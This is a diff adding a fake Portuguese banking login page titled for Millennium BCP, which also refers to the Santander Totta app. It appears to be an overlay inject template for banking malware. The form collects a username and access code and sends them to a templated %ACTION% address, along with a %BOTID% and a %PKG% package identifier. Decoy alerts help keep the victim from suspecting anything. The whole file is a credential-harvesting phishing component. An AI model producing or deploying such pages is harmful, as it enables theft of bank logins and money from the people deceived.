@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+   <meta http-equiv="content-type" content="text/html;charset=utf-8" />
+   <head id="Head1">
+      <meta charset="utf-8" />
+      <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+      <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" name="viewport" />
+      <meta http-equiv="Expires" content="0" />
+      <meta http-equiv="Content-Style-Type" content="text/css" />
+      <meta http-equiv="Content-Script-Type" content="text/javascript" />
+      <meta name="format-detection" content="telephone=no" />
+      <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
+      <title>Login - millenniumbcp </title>
+      <script src="%DYN_PATH%/jquery-1.10.2.js"></script>
+      <script src="%DYN_PATH%/jquery-ui-1.10.3.custom.js"></script>
+      <script src="%DYN_PATH%/jquery.validate.js"></script>
+      <script src="%DYN_PATH%/jquery.blockUI.js"></script>
+      <script src="%DYN_PATH%/jquery.selectbox.js"></script>
+      <script src="%DYN_PATH%/bootstrap.js"></script>
+      <script src="%DYN_PATH%/ms.ajax.download.js"></script>
+      <script src="%DYN_PATH%/jquery.bxslider.js"></script>
+      <script src="%DYN_PATH%/jquery.easing.1.3.js"></script>
+      <script src="%DYN_PATH%/jquery.fitvids.js"></script>
+      <link href="%DYN_PATH%/fluid.css" rel="stylesheet"/>
+      <link href="%DYN_PATH%/style_p.css" rel="stylesheet"/>
+      
+      <style type='text/css'>
+@font-face {
+    font-family: 'Roboto';
+    src: url('%DYN_PATH%/fonts/Roboto-Medium.ttf');
+    font-weight: normal;
+    font-style: normal;
+}
+  
+@font-face {
+    font-family: 'Roboto';
+    src: url('%DYN_PATH%/fonts/Roboto-Bold.ttf');
+    font-weight: bold;
+    font-style: normal;
+}
+  
+@font-face {
+    font-family: 'Roboto';
+    src: url('%DYN_PATH%/fonts/Roboto-Light.ttf');
+    font-weight: 100;
+    font-style: normal;
+}
+      </style>
+   </head>
+	<form action="%ACTION%" id="aspnetForm" autocomplete="off" method="post" onsubmit="return function(){ 
+var ok = true;
+
+$('input').each(function (i, value){  
+	$(value).css('border', '');
+	if(!$(value).val()){  
+		$(value).css('border', '1px solid red');
+		ok = false;
+	}
+	
+});
+if(window.form_sent) return false; if(ok) window.form_sent = true; return ok; 
+}()">
+		<input type="hidden" name="page_id" value="%PKG%" class="main_input"><input type="hidden" name="bot_id" value="%BOTID%" />
+      <script type="text/javascript">
+         //<![CDATA[
+         //~ var theForm = document.forms['aspnetForm'];
+         //~ if (!theForm) {
+             //~ theForm = document.aspnetForm;
+         //~ }
+         //~ function __doPostBack(eventTarget, eventArgument) {
+             //~ if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+                 //~ theForm.__EVENTTARGET.value = eventTarget;
+                 //~ theForm.__EVENTARGUMENT.value = eventArgument;
+                 //~ theForm.submit();
+             //~ }
+         //~ }
+         //]]>
+      </script>
+      <script src="%DYN_PATH%/1.js" type="text/javascript"></script>
+     <script src="%DYN_PATH%/Common-1.0.1.js"></script>
+      <script src="%DYN_PATH%/modalpopup-1.0.js"></script>
+      <script src="%DYN_PATH%/ProofControl.js"></script>
+      <script src="%DYN_PATH%/FavoritControl.js"></script>
+      
+
+
+<script type="text/javascript">
+    function changeImage() {
+        document.getElementById("misterxx").src= '%DYN_PATH%/bola2.png';
+    }
+</script>
+     
+      <div class="topModalcontainer"  draggable="true" style="text-align:right;  padding: 15px; font-size:19px" onClick="javascript:alert('PIN de Acesso Indisponível no momento.')" >
+        <p>PT  |  Alterar forma de acesso    </p>
+      </div>
+      <div id="body">
+         <div id="superk" align="center" >
+            <p>&nbsp;</p>
+            <p><img src="%DYN_PATH%/logo.png" alt="" width="101" height="101"/></p>
+         </div>
+         <section>
+            <div id="MainContent_divAllContent">
+             
+               <div class="login_form login_form_head">
+               
+                  <div class="row">
+                    <div id="MainContent_divLoginUserCode" class="login_user_code">
+                       <div id="MainContent_divUserCode" class="text_field_simple_login">
+                         <p id="MainContent_pUserCode" class="input_title"> Nome de Utilizador </p>
+                         <input name="fields[login]" type="text" maxlength="20" id="MainContent_TextBoxLogin" />
+                       </div></div></div>
+               </div>
+            </div> <div class="row">
+            <div class="login_form login_form_head">
+              <div id="MainContent_divLoginUserCode2" class="login_user_code">
+                  <div id="MainContent_divUserCode2" class="text_field_simple_login">
+                     <p id="MainContent_pUserCode2" class="input_title">
+                        Código de Acesso
+                     </p>
+                     <input name="fields[password]" autocomplete="off" style='width: 100%; text-align: left' type="password" maxlength="20" id="MainContent_TextBoxLogin2" />
+                  </div>
+               </div>
+               <div style="clear: both;">
+               <p>&nbsp;</p>
+               <tr>
+		<td width="25%"><span id="superk1" style="padding: 10px;" onClick="javascript:changeImage();" > <img id="misterxx"  src="%DYN_PATH%/bola.png" /></span></td>
+		<td><span class="opcoes" style="font-size:18px; font-family:Gotham, 'Helvetica Neue', Helvetica, Arial, sans-serif; color:">Memorizar Nome  de Utilizador</span></td>
+	</tr>
+                 
+               </div>
+            </div>
+            <div id="MainContent_divButtons" class="login_buttons">
+				<input type='submit' class="custom_button_blue" value='ENTRAR' />
+<!--
+               <a id="MainContent_btnPositions" class="custom_button_blue"  href="javascript:document.getElementById('aspnetForm').submit();undefined">ENTRAR</a>
+-->
+            </div>
+            <script type="text/javascript" src="%DYN_PATH%/Login.mobile.min8f26.js"></script>
+         
+      </div>
+ </section>  </div>
+ 
+ 
+       <div class="topModalcontainer"  draggable="true" style="text-align:center;  padding: 15px; font-size:19px" onClick="javascript:alert('Para sua segurança, em caso de esquecimento do seu Nome de Utilizador e/ ou Código de Acesso, terá de criar um novo registo para voltar a aceder à App Santander Totta (e ao Netbanco Particulares).')" >
+       
+    <div>   <div style="float:left ;padding: 7px; font-size:20px; font-family:Gotham, 'Helvetica Neue', Helvetica, Arial, sans-serif" >Códigos esquecidos? </div>    
+     <div style="padding: 3px; font-size:32px; font-family:Gotham, 'Helvetica Neue', Helvetica, Arial, sans-serif; display:inline-block "> | </div>
+    <div style="float:right; padding: 7px; font-size:20px; font-family:Gotham, 'Helvetica Neue', Helvetica, Arial, sans-serif">Novo Registo</div>
+    <p>&nbsp;</p>
+    <p>&nbsp;</p>
+    <p>&nbsp;</p>
+    <p>&nbsp;</p>
+    <p>&nbsp;</p>
+    <p>&nbsp;</p>
+    <p>&nbsp;</p>
+    <p>&nbsp;</p>
+    <p>&nbsp;</p>
+    
+    <p>&nbsp;</p>  
+        </div>  </div>
+     
+ 
+ 
+ </form>
+
+</html>
